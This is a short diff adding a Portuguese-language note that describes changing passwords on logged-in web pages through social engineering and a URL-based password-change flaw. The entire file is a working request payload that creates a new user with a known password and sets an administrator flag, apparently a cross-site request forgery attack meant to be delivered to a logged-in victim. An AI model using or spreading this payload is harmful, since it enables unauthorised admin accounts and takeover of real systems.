@@ -1,0 +1,4 @@
+# Método para trocar senha de páginas logadas através de Engenharia social e utilização de vulnerabilidade que é possível alterar senha via URL.
+
+
+Example: sqlState=NewRecord&txtUserName=camila&txtUserPassword=123456&txtUserConfirmPassword=123456&cmbUserStatus=Enabled&txtUserEmpID=&cmbUserEmpID=&cmbUserGroupID=USG001&chkUserIsAdmin=true
